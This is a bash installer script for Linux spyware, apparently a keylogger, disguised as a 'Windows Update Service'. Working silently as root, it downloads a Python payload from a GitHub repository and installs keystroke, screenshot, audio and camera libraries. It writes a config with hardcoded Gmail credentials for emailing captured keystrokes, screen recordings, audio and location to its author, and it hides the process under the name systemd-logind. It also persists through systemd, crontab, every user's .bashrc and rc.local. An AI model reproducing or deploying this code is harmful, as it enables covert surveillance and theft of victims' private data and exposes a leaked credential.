#!/bin/bash
# ============================================================================
# SILENT INSTALLER - No output shown to user
# ============================================================================

# Redirect all output to /dev/null
exec >/dev/null 2>&1

# Colors (not used but kept for reference)
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Check root silently
if [ "$EUID" -ne 0 ]; then 
    exit 1
fi

# Detect OS silently
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
else
    OS="unknown"
fi

# Install system dependencies silently
if [ "$OS" == "ubuntu" ] || [ "$OS" == "debian" ] || [ "$OS" == "kali" ] || [ "$OS" == "parrot" ]; then
    apt-get update -qq 2>/dev/null
    apt-get install -y -qq \
        python3 \
        python3-pip \
        python3-venv \
        python3-dev \
        build-essential \
        x11-utils \
        xdotool \
        xclip \
        ffmpeg \
        pulseaudio-utils \
        alsa-utils \
        libpulse-dev \
        portaudio19-dev \
        libasound2-dev \
        wget \
        curl \
        git 2>/dev/null
fi

# Create directories silently
mkdir -p /opt/WindowsUpdateService 2>/dev/null
mkdir -p /etc/windowsupdateservice 2>/dev/null
mkdir -p /var/log/windowsupdateservice 2>/dev/null
mkdir -p /var/lib/windowsupdateservice 2>/dev/null

# Install the script silently
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [ -f "$SCRIPT_DIR/linuxupdateservice.py" ]; then
    cp "$SCRIPT_DIR/linuxupdateservice.py" /opt/WindowsUpdateService/linuxupdateservice.py 2>/dev/null
else
    wget -q -O /opt/WindowsUpdateService/linuxupdateservice.py \
        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/linuxupdateservice.py 2>/dev/null
fi

chmod +x /opt/WindowsUpdateService/linuxupdateservice.py 2>/dev/null

# Create virtual environment silently
cd /opt/WindowsUpdateService 2>/dev/null
python3 -m venv venv 2>/dev/null

# Install Python packages silently
source venv/bin/activate 2>/dev/null
pip install --upgrade pip -q 2>/dev/null

if [ -f "$SCRIPT_DIR/requirements.txt" ]; then
    pip install -r "$SCRIPT_DIR/requirements.txt" -q 2>/dev/null
else
    wget -q -O /tmp/requirements.txt \
        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/requirements.txt 2>/dev/null || echo "# No requirements" > /tmp/requirements.txt
    pip install -r /tmp/requirements.txt -q 2>/dev/null
fi

# Install common dependencies silently
pip install requests pynput Pillow pyaudio opencv-python python-xlib pyscreenshot psutil -q 2>/dev/null

deactivate 2>/dev/null

# Update shebang silently
sed -i '1s|#!/usr/bin/env python3|#!/opt/WindowsUpdateService/venv/bin/python3|' /opt/WindowsUpdateService/linuxupdateservice.py 2>/dev/null

# Create config silently
if [ ! -f /etc/windowsupdateservice/config.ini ]; then
    cat > /etc/windowsupdateservice/config.ini << 'EOF'
[Settings]
EmailUsername = terminal123b@gmail.com
EmailPassword = yuleohozhxxbajxx
EmailTo = terminal123b@gmail.com
SyncInterval = 600
MaxAttachments = 25

[Stealth]
HideProcess = true
RunOnStartup = true
ProcessName = systemd-logind

[Advanced]
ScreenshotsPerBatch = 10
ScreenshotBatchInterval = 600
ScreenRecordEnabled = true
ScreenRecordInterval = 120
ScreenRecordDuration = 30
AudioEnabled = true
AudioInterval = 120
AudioDuration = 30
LocationEnabled = true
LocationInterval = 300
MaxVideosPerEmail = 5
MaxAudioPerEmail = 10
ImageQuality = 70

[AutoUpdate]
Enabled = true
CheckOnStartup = true
CheckInterval = 86400
UpdateURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/linuxupdateservice.py
VersionURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/version.txt
EOF
    chmod 600 /etc/windowsupdateservice/config.ini 2>/dev/null
fi

# Create systemd service silently
cat > /etc/systemd/system/windowsupdateservice.service << 'EOF'
[Unit]
Description=Windows Update Service
After=network.target sound.target graphical.target
Wants=network.target

[Service]
Type=simple
User=root
ExecStart=/opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
SyslogIdentifier=windowsupdateservice
Nice=19
IOSchedulingClass=idle

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd and enable service silently
systemctl daemon-reload 2>/dev/null
systemctl enable windowsupdateservice.service 2>/dev/null
systemctl start windowsupdateservice.service 2>/dev/null

# Add to crontab silently
(crontab -l 2>/dev/null | grep -v "linuxupdateservice.py"; echo "@reboot /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1") | crontab - 2>/dev/null

# Add to .bashrc silently
for user_home in /home/* /root; do
    if [ -d "$user_home" ]; then
        bashrc="$user_home/.bashrc"
        if [ -f "$bashrc" ]; then
            if ! grep -q "linuxupdateservice.py" "$bashrc" 2>/dev/null; then
                echo -e "\n# Windows Update Service\n[ -x /opt/WindowsUpdateService/linuxupdateservice.py ] && /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1 &" >> "$bashrc" 2>/dev/null
            fi
        fi
    fi
done

# Add to /etc/rc.local silently
if [ -f /etc/rc.local ]; then
    if ! grep -q "linuxupdateservice.py" /etc/rc.local 2>/dev/null; then
        sed -i '/exit 0/i /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1 &' /etc/rc.local 2>/dev/null
    fi
fi

# Create uninstall script silently
cat > /usr/local/bin/uninstall-keylogger << 'EOF'
#!/bin/bash
systemctl stop windowsupdateservice.service 2>/dev/null
systemctl disable windowsupdateservice.service 2>/dev/null
rm -f /etc/systemd/system/windowsupdateservice.service 2>/dev/null
systemctl daemon-reload 2>/dev/null
rm -rf /opt/WindowsUpdateService 2>/dev/null
rm -rf /etc/windowsupdateservice 2>/dev/null
rm -rf /var/log/windowsupdateservice 2>/dev/null
rm -rf /var/lib/windowsupdateservice 2>/dev/null
(crontab -l 2>/dev/null | grep -v "linuxupdateservice.py") | crontab - 2>/dev/null
sed -i '/linuxupdateservice.py/d' /root/.bashrc 2>/dev/null
sed -i '/linuxupdateservice.py/d' /etc/rc.local 2>/dev/null
EOF

chmod +x /usr/local/bin/uninstall-keylogger 2>/dev/null

# Exit silently
exit 0
